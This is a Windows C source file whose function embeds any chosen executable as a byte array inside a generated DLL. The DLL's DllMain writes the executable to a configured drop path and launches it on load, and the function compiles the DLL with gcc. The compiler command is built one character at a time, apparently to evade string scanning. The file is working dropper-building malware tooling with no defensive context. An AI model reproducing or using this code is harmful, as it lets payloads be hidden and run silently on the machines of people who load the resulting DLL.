#include <windows.h>
#include <stdio.h>
#include "config.h"

int build_launcher_dll(const char *binary_path, const char *dll_out_path)
{
    HANDLE input = INVALID_HANDLE_VALUE;
    FILE *source = NULL;
    char temp_dir[MAX_PATH];
    char source_path[MAX_PATH];
    char output_dir[MAX_PATH];
    char output_path[MAX_PATH];
    char command_line[32768];
    STARTUPINFOA startup;
    PROCESS_INFORMATION process;
    LARGE_INTEGER file_size;
    ULONGLONG remaining;
    DWORD temp_dir_len;
    DWORD bytes_read;
    DWORD wait_result;
    DWORD exit_code;
    size_t output_dir_len;
    size_t command_len;
    size_t i;
    int result = -1;
    int source_created = 0;
    int output_created = 0;

    if (binary_path == NULL || dll_out_path == NULL ||
        binary_path[0] == '\0' || dll_out_path[0] == '\0') {
        return -1;
    }

    input = CreateFileA(binary_path, GENERIC_READ, FILE_SHARE_READ, NULL,
                        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (input == INVALID_HANDLE_VALUE) {
        goto cleanup;
    }

    if (!GetFileSizeEx(input, &file_size) || file_size.QuadPart < 0) {
        goto cleanup;
    }

    temp_dir_len = GetTempPathA(MAX_PATH, temp_dir);
    if (temp_dir_len == 0 || temp_dir_len >= MAX_PATH ||
        !GetTempFileNameA(temp_dir, "bld", 0, source_path)) {
        goto cleanup;
    }
    source_created = 1;

    output_dir_len = 0;
    for (i = 0; dll_out_path[i] != '\0'; ++i) {
        if (dll_out_path[i] == '\\' || dll_out_path[i] == '/') {
            output_dir_len = i + 1;
        }
    }
    if (output_dir_len == 0) {
        output_dir[0] = '.';
        output_dir[1] = '\0';
    } else {
        if (output_dir_len >= MAX_PATH) {
            goto cleanup;
        }
        for (i = 0; i < output_dir_len; ++i) {
            output_dir[i] = dll_out_path[i];
        }
        output_dir[output_dir_len] = '\0';
    }

    if (!GetTempFileNameA(output_dir, "bld", 0, output_path)) {
        goto cleanup;
    }
    output_created = 1;

    source = fopen(source_path, "wb");
    if (source == NULL) {
        goto cleanup;
    }

    if (fprintf(source,
                "#include <windows.h>\n"
                "static const unsigned char embedded_data[] = {\n") < 0) {
        goto cleanup;
    }

    remaining = (ULONGLONG)file_size.QuadPart;
    while (remaining != 0) {
        unsigned char buffer[16384];
        DWORD requested = remaining > sizeof(buffer) ? (DWORD)sizeof(buffer) : (DWORD)remaining;
        DWORD offset;

        if (!ReadFile(input, buffer, requested, &bytes_read, NULL) ||
            bytes_read != requested) {
            goto cleanup;
        }

        for (offset = 0; offset < bytes_read; ++offset) {
            if (fprintf(source, "0x%02X,", (unsigned int)buffer[offset]) < 0) {
                goto cleanup;
            }
            if ((offset & 15U) == 15U && fputc('\n', source) == EOF) {
                goto cleanup;
            }
        }
        remaining -= bytes_read;
    }

    if (file_size.QuadPart == 0 && fprintf(source, "0") < 0) {
        goto cleanup;
    }

    if (fprintf(source,
                "\n};\n"
                "static const unsigned long long embedded_size = %lluULL;\n"
                "BOOL WINAPI DllMain(HINSTANCE instance, DWORD reason, LPVOID reserved)\n"
                "{\n"
                "    (void)instance;\n"
                "    (void)reserved;\n"
                "    if (reason == DLL_PROCESS_ATTACH) {\n"
                "        HANDLE file = CreateFileA(\"",
                (unsigned long long)file_size.QuadPart) < 0) {
        goto cleanup;
    }

    {
        const unsigned char *p = (const unsigned char *)DROP_PATH;
        while (*p != 0) {
            unsigned char c = *p++;
            if (c == '\\' || c == '"') {
                if (fputc('\\', source) == EOF) {
                    goto cleanup;
                }
            }
            if (c < 32 || c > 126) {
                if (fprintf(source, "\\%03o", (unsigned int)c) < 0) {
                    goto cleanup;
                }
            } else if (fputc(c, source) == EOF) {
                goto cleanup;
            }
        }
    }

    if (fprintf(source,
                "\", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, "
                "FILE_ATTRIBUTE_NORMAL, NULL);\n"
                "        if (file != INVALID_HANDLE_VALUE) {\n"
                "            unsigned long long position = 0;\n"
                "            while (position < embedded_size) {\n"
                "                DWORD amount = (DWORD)((embedded_size - position) "
                "> 65536ULL ? 65536ULL : (embedded_size - position));\n"
                "                DWORD written = 0;\n"
                "                if (!WriteFile(file, embedded_data + position, "
                "amount, &written, NULL) || written == 0) break;\n"
                "                position += written;\n"
                "            }\n"
                "            CloseHandle(file);\n"
                "        }\n"
                "        {\n"
                "            STARTUPINFOA startup;\n"
                "            PROCESS_INFORMATION process;\n"
                "            ZeroMemory(&startup, sizeof(startup));\n"
                "            ZeroMemory(&process, sizeof(process));\n"
                "            startup.cb = sizeof(startup);\n"
                "            if (CreateProcessA(\"") < 0) {
        goto cleanup;
    }

    {
        const unsigned char *p = (const unsigned char *)DROP_PATH;
        while (*p != 0) {
            unsigned char c = *p++;
            if (c == '\\' || c == '"') {
                if (fputc('\\', source) == EOF) {
                    goto cleanup;
                }
            }
            if (c < 32 || c > 126) {
                if (fprintf(source, "\\%03o", (unsigned int)c) < 0) {
                    goto cleanup;
                }
            } else if (fputc(c, source) == EOF) {
                goto cleanup;
            }
        }
    }

    if (fprintf(source,
                "\", NULL, NULL, NULL, FALSE, 0, NULL, NULL, "
                "&startup, &process)) {\n"
                "                CloseHandle(process.hThread);\n"
                "                CloseHandle(process.hProcess);\n"
                "            }\n"
                "        }\n"
                "    }\n"
                "    return TRUE;\n"
                "}\n") < 0 || fflush(source) != 0 || ferror(source)) {
        goto cleanup;
    }

    if (fclose(source) != 0) {
        source = NULL;
        goto cleanup;
    }
    source = NULL;

    ZeroMemory(command_line, sizeof(command_line));
    command_len = 0;
    {
        const char *args[2];
        size_t arg_index;

        args[0] = output_path;
        args[1] = source_path;

        command_line[command_len++] = 'g';
        command_line[command_len++] = 'c';
        command_line[command_len++] = 'c';
        command_line[command_len++] = '.';
        command_line[command_len++] = 'e';
        command_line[command_len++] = 'x';
        command_line[command_len++] = 'e';
        command_line[command_len++] = ' ';
        command_line[command_len++] = '-';
        command_line[command_len++] = 's';
        command_line[command_len++] = 'h';
        command_line[command_len++] = 'a';
        command_line[command_len++] = 'r';
        command_line[command_len++] = 'e';
        command_line[command_len++] = 'd';
        command_line[command_len++] = ' ';
        command_line[command_len++] = '-';
        command_line[command_len++] = 'O';
        command_line[command_len++] = '2';
        command_line[command_len++] = ' ';
        command_line[command_len++] = '-';
        command_line[command_len++] = 'o';
        command_line[command_len++] = ' ';

        for (arg_index = 0; arg_index < 2; ++arg_index) {
            const char *p = args[arg_index];

            if (arg_index != 0) {
                command_line[command_len++] = ' ';
            }
            command_line[command_len++] = '"';

            while (*p != '\0') {
                size_t slashes = 0;
                while (*p == '\\') {
                    ++slashes;
                    ++p;
                }

                if (*p == '"') {
                    size_t n;
                    for (n = 0; n < slashes * 2 + 1; ++n) {
                        command_line[command_len++] = '\\';
                    }
                    command_line[command_len++] = *p++;
                } else if (*p == '\0') {
                    size_t n;
                    for (n = 0; n < slashes * 2; ++n) {
                        command_line[command_len++] = '\\';
                    }
                    break;
                } else {
                    size_t n;
                    for (n = 0; n < slashes; ++n) {
                        command_line[command_len++] = '\\';
                    }
                    command_line[command_len++] = *p++;
                }
            }

            command_line[command_len++] = '"';
        }
        command_line[command_len] = '\0';
    }

    ZeroMemory(&startup, sizeof(startup));
    ZeroMemory(&process, sizeof(process));
    startup.cb = sizeof(startup);

    if (!CreateProcessA(NULL, command_line, NULL, NULL, FALSE, 0, NULL, NULL,
                        &startup, &process)) {
        goto cleanup;
    }

    wait_result = WaitForSingleObject(process.hProcess, INFINITE);
    exit_code = 1;
    if (wait_result == WAIT_OBJECT_0) {
        GetExitCodeProcess(process.hProcess, &exit_code);
    }
    CloseHandle(process.hThread);
    CloseHandle(process.hProcess);

    if (wait_result != WAIT_OBJECT_0 || exit_code != 0) {
        goto cleanup;
    }

    if (!MoveFileExA(output_path, dll_out_path,
                     MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH)) {
        goto cleanup;
    }
    output_created = 0;
    result = 0;

cleanup:
    if (source != NULL) {
        fclose(source);
    }
    if (input != INVALID_HANDLE_VALUE) {
        CloseHandle(input);
    }
    if (source_created) {
        DeleteFileA(source_path);
    }
    if (output_created) {
        DeleteFileA(output_path);
    }
    return result;
}